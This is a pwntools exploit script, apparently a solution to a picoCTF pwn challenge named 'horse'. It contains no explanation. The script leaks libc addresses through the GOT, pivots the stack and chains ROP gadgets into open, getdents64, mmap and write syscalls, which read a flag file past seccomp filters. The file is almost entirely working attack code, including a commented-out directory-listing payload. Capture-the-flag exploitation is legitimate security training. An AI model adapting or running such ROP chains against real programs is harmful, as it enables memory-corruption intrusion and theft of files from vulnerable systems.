#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mars.picoctf.net --port 31809 ./horse
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./horse')
libc_path = './libc.so.6'
libc = ELF(libc_path)
if args.LIBC:
     os.environ['LD_PRELOAD'] = libc_path

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mars.picoctf.net'
port = int(args.PORT or 31809)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:

        #io = process([exe.path] + argv, *a, **kw)
        #gdb.attach(io, gdbscript=gdbscript)
        #return io
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
b *horse+212
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

REREAD=0x400b6f
#REREAD=0x400b7b
GAD_POP_RBP=0x0000000000400828
GAD_POP_RDI=0x0000000000400c03
GAD_POP_RSI=0x0000000000400c01

STACK_PIVOT=0x602050

GOT=0x601f98
PRINT_FUNC=0x400b8c
WRITE_CALL=0x400b38

io = start()
time.sleep(1)
payload = b'\x00'*32
payload += p64(STACK_PIVOT)
payload += p64(REREAD)
payload += b'B'*32
io.sendline(payload)

io.recvuntil(b'<')
data = io.recvuntil(b'>')
print(f'0: {len(data)} {data}')

payload = b'\x00'*32
payload += p64(STACK_PIVOT+0x50)
payload += p64(GAD_POP_RSI)
payload += p64(GOT)
payload += p64(0)
payload += p64(WRITE_CALL)
payload += b'C'*16
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(STACK_PIVOT+0x50)
payload += p64(REREAD)
io.send(payload)

io.recvuntil(b'<')
data = io.recvuntil(b'>')
print(f'1: {len(data)} {data}')

'''
[0x601f98] free@GLIBC_2.2.5  →  0x7fe02ed666d0
[0x601fa0] seccomp_init  →  0x7fe02eec0780
[0x601fa8] seccomp_rule_add  →  0x7fe02eec0e50
[0x601fb0] write@GLIBC_2.2.5  →  0x7fe02edda060
'''

io.recvuntil(b'/     /   ')
io.recvuntil(b'\n')
leak_free = u64(io.recv(8))
leak_seccomp_init = u64(io.recv(8))
leak_seccomp_rule_add = u64(io.recv(8))
leak_write = u64(io.recv(8))

print(f'LEAKS: free : {hex(leak_free)}')
print(f'LEAKS: write: {hex(leak_write)}')

LIBC_BASE = leak_free - libc.symbols.free
print(f'LEAKS: LIBC_BASE: {hex(LIBC_BASE)}')

GAD_POP_RAX = LIBC_BASE + 0x4a550
GAD_SYSCALL_RET = LIBC_BASE + 0x66229
GAD_POP_RSI = LIBC_BASE + 0x27529
GAD_EDX = LIBC_BASE + 0x19829a # mov edx, 0x94d3ff3; ret;
GAD_MOV_ECX_RDX = LIBC_BASE + 0x13f9c6 
GAD_POP_ECX = LIBC_BASE + 0x9f822

O_DIRECTORY = 0x10000

#### FINALLY Getting to doing an actual ROP now...
payload = b'\x00'*32
payload += p64(STACK_PIVOT+0x50)

payload += p64(GAD_POP_RAX)
payload += p64(0)
payload += p64(GAD_POP_RDI)
payload += p64(0)
payload += p64(GAD_POP_RSI)
payload += p64(0x602080)
payload += p64(GAD_POP_ECX)
payload += p64(0x1000)
payload += p64(GAD_MOV_ECX_RDX)

payload += p64(GAD_SYSCALL_RET)
io.send(payload)

io.interactive()

#payload to leak the file name : flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt
"""
payload = b'.'
payload += b'\x00'*(32-len(payload))
payload += p64(STACK_PIVOT+0x50)
payload += b'\x00'*80

payload += p64(GAD_POP_RAX)
payload += p64(2)
payload += p64(GAD_POP_RDI)
payload += p64(0x602080)
payload += p64(GAD_POP_RSI)
payload += p64(O_DIRECTORY)
payload += p64(GAD_SYSCALL_RET)
## if successful, then we'll have FD=3 (rax will be 3)

payload += p64(GAD_POP_RAX)
payload += p64(217) # sys_getdents64
payload += p64(GAD_POP_RDI)
payload += p64(3)   # FD
payload += p64(GAD_POP_RSI)
payload += p64(LIBC_BASE+0x1eb000) # why not... let put it here...
payload += p64(GAD_SYSCALL_RET)
#RDX hold count... should be ok?

payload += p64(GAD_POP_RAX)
payload += p64(1) # write
payload += p64(GAD_POP_RDI)
payload += p64(1)   # stdout
payload += p64(GAD_POP_RSI)
payload += p64(LIBC_BASE+0x1eb000)
payload += p64(GAD_POP_ECX)
payload += p64(0x100)
payload += p64(GAD_MOV_ECX_RDX)
payload += p64(GAD_SYSCALL_RET)

#payload += cyclic(1000)
payload += p64(0x44556677)
"""
#---------------------------------------------------------------

FLAG_FILE_NAME = b'./flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt'
payload = b''
payload += b'\x00'*(32-len(payload))
payload += p64(STACK_PIVOT+0x50)
payload += FLAG_FILE_NAME
payload += b'\x00'*(80-len(FLAG_FILE_NAME))

payload += p64(GAD_POP_RAX)
payload += p64(2)
payload += p64(GAD_POP_RDI)
payload += p64(0x6020a8)
payload += p64(GAD_POP_RSI)
payload += p64(0)
payload += p64(GAD_SYSCALL_RET)
## if successful, then we'll have FD=3 (rax will be 3)

GAD_R9=LIBC_BASE + 0x7d2f0  #: mov r9, rax; pop r12; pop r13; mov rax, r9; pop r14; ret;
GAD_R10=LIBC_BASE + 0xbf917 #: mov r10, rax; mov eax, dword ptr [r8 + rax*4]; sub eax, dword ptr [r8 + r9*4]; je 0xbf900; ret;
GAD_R8=LIBC_BASE + 0x156298 #: mov r8, rax; mov rax, r8; pop rbx; ret;

payload += p64(GAD_POP_RAX)
payload += p64(0)
payload += p64(GAD_R9)
payload += p64(0)
payload += p64(0)
payload += p64(0)

payload += p64(GAD_POP_RAX)
payload += p64(STACK_PIVOT) 
payload += p64(GAD_R8)
payload += p64(0x0)
payload += p64(GAD_POP_RAX)
payload += p64(2) 
payload += p64(GAD_R10)


payload += p64(GAD_POP_RSI)
payload += p64(0x1000)
payload += p64(GAD_POP_ECX)
payload += p64(0x1)
payload += p64(GAD_MOV_ECX_RDX)

payload += p64(GAD_POP_RAX)
payload += p64(3) #FD of file
payload += p64(GAD_R8)
payload += p64(0x0)


payload += p64(GAD_POP_RAX)
payload += p64(9) # mmapsys_number

payload += p64(GAD_POP_RDI)
payload += p64(0x100000) # NULL Address

payload += p64(GAD_SYSCALL_RET)


payload += p64(GAD_POP_RAX)
payload += p64(1) # write
payload += p64(GAD_POP_RDI)
payload += p64(1)   # stdout
payload += p64(GAD_POP_RSI)
payload += p64(0x100000) # READ from the mmaped address
payload += p64(GAD_POP_ECX)
payload += p64(0x100)
payload += p64(GAD_MOV_ECX_RDX)
payload += p64(GAD_SYSCALL_RET)


io.sendline(payload)

io.interactive()

io.sendline(payload)

io.interactive()

